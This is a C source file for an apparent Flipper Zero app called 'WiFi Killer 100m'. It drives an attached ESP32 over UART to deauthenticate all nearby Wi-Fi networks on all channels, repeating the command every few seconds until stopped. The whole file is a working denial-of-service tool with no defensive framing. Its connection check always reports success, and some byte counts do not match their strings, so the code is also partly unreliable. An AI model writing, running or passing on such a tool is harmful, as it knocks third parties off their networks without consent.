#include <furi.h>
#include <gui/gui.h>
#include <input/input.h>
#include <furi_hal_serial.h>
// NEW: Include the expansion module header
#include <expansion/expansion.h> 

static bool running = true;
static bool esp32_connected = false;

#define UART_CHANNEL 0 // USART1

static void input_callback(InputEvent* input, void* ctx) {
    UNUSED(ctx);
    if(input->type == InputTypePress && input->key == InputKeyBack) {
        running = false;
    }
}

// Try to init UART safely
static bool init_uart() {
    furi_hal_serial_init(UART_CHANNEL, 115200);
    furi_delay_ms(200);
    furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT\r\n", 4);
    furi_delay_ms(100);
    return true;
}

static void send_deauth_command() {
    if(esp32_connected) {
        furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+DEAUTH=ALL,100,0\r\n", 22);
        furi_delay_ms(50);
        furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+CHANNEL=ALL\r\n", 17);
        furi_delay_ms(50);
        furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+BROADCAST=1\r\n", 17);
    }
}

static void draw_callback(Canvas* canvas, void* ctx) {
    UNUSED(ctx);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 20, "WiFi Killer 100m");
    canvas_set_font(canvas, FontSecondary);
    
    if(esp32_connected) {
        canvas_draw_str(canvas, 5, 40, "Jamming ALL channels");
        canvas_draw_str(canvas, 5, 55, "Press BACK to stop");
        canvas_draw_str(canvas, 5, 70, "ESP32: ACTIVE");
    } else {
        canvas_draw_str(canvas, 5, 40, "ESP32 NOT FOUND");
        canvas_draw_str(canvas, 5, 55, "Connect ESP32 to pins");
        canvas_draw_str(canvas, 5, 70, "13=TX, 14=RX, GND, 3V3");
    }
}

int32_t wifi_killer_app(void* p) {
    UNUSED(p);
    
    // NEW: Get a handle to the expansion system and disable it
    Expansion* expansion = furi_record_open(RECORD_EXPANSION);
    expansion_disable(expansion);
    
    // GUI setup
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, draw_callback, NULL);
    view_port_input_callback_set(view_port, input_callback, NULL);
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);
    
    // Try to init UART
    esp32_connected = init_uart();
    
    if(esp32_connected) {
        send_deauth_command();
    }
    
    // Main loop
    uint32_t counter = 0;
    while(running) {
        furi_delay_ms(100);
        counter++;
        if(counter > 30 && esp32_connected) {
            counter = 0;
            send_deauth_command();
        }
    }
    
    // Clean shutdown
    if(esp32_connected) {
        furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+STOP\r\n", 9);
        furi_delay_ms(100);
        furi_hal_serial_deinit(UART_CHANNEL);
    }
    
    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    
    // NEW: Re-enable the expansion system when we're done
    expansion_enable(expansion);
    furi_record_close(RECORD_EXPANSION);
    
    return 0;
}
